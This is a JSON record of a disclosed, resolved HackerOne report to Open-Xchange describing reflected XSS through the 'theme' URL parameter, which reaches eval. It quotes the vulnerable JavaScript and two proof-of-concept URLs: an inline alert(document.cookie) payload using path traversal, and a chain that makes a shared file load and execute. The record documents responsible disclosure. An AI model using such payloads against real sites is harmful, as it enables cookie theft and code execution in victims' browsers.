{"id":340926,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDA5MjY=","url":"https://hackerone.com/reports/340926","title":"[XSS] Parameter Theme ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-04-20T01:44:51.309Z","submitted_at":"2018-04-20T01:44:51.309Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"secator","url":"/secator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/057/075/665d5508baf6704a821e8b1dc79d6fda2f52389a_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-01-24T11:46:18.354Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-04T11:13:17.438Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi.\n\nI found two cases via `theme`: inline (`fail`) \u0026\u0026 inject file (`done`)\n```js\n$.when.apply(this, g).then(function() {\n    return g.map(function(a) {\n        return a.responseText\n    }).join(\"/*:oxsep:*/\")\n}).done(function(c) {\n`2`####    runCode([ox.apiRoot, \"/apps/load/\", ox.version, \",\", a].join(\"\"), c), e.completeLoad(b), _(c.split(\"/*:oxsep:*/\")).each(function(a) {\n        ! function() {\n            var b = null,\n                c = a.match(/define(\\.async)?\\(([^,]+),/);\n            if (c \u0026\u0026 (b = c[2].substr(1, c[2].length - 2)), b) {\n                if (badSource(a)) return void(_.url.hash(\"debug-filecache\") \u0026\u0026 console.warn(\"FileCache: NOT Caching \" + b));\n                _.url.hash(\"debug-filecache\") \u0026\u0026 console.log(\"FileCache: Caching \" + b), fileCache.cache(b, a)\n            } else _.url.hash(\"debug-filecache\") \u0026\u0026 console.log(\"FileCache: Could not determine name for \" + a)\n        }()\n    })\n}).fail(function() {\n    var c = a.split(\",\");\n    c.length \u003e 1 ? (console.warn(\"Problem loading concatenated modules, falling back to separate file loading\"), c.forEach(function(a) {\n        var b = a.replace(/\\.js$/, \"\");\n        j(a, b)\n    })) : \n`1`####  (runCode([ox.apiRoot, \"/apps/load/\", ox.version, \",\", a].join(\"\"), 'define(\"' + b + '\", function () { console.error(\"Could not load module ' + b + '. Defining dummy module.\");})'), e.completeLoad(b))\n})\n```\n```js\nfunction runCode(name, code) {\n    eval(code)\n}\n```\n\n1. Inline JS\n-\nGo to https://sandbox.open-xchange.com/appsuite/#!!\u0026app=io.ox/files\u0026folder=9\u0026theme=../../../0\"%2Balert(document.cookie)%2B%22\n\nIf load theme file fail, then `eval('define(\u003ctheme\u003e, function () { ... `\n\n2. Inject File\n-\n\n1. Go to for auth: https://sandbox.open-xchange.com/ajax/share/09c3a56b062fd5559c3a5ee62fd5439d94d131e0dc41c2de/1/8/NTY/NTYvMjEx\n2. Go to load file \u0026\u0026 execute: https://sandbox.open-xchange.com/appsuite/#!!\u0026app=io.ox/files\u0026folder=9\u0026theme=../../../../files/%3Faction%3Ddocument%26folder%3D10%26id%3D10%252F211%26delivery%3Dview\n\nIf load theme file done, then `eval(\u003ccontent from file\u003e)`\n\n## Impact\n\nmalicious code injection","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["ali","eveeez","rishabh"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2646653,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report","automated_response":false,"created_at":"2018-04-20T12:18:28.147Z","updated_at":"2018-04-20T12:18:28.147Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2680200,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-04-30T15:34:43.281Z","updated_at":"2018-04-30T15:34:43.281Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"secator","url":"/secator"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2680213,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-04-30T15:37:08.785Z","updated_at":"2018-04-30T15:37:08.785Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"secator","url":"/secator"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5253112,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-07-04T11:13:17.478Z","updated_at":"2019-07-04T11:13:17.478Z","first_to_agree":true,"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6860919,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2020-01-24T11:46:18.306Z","updated_at":"2020-01-24T11:46:18.306Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}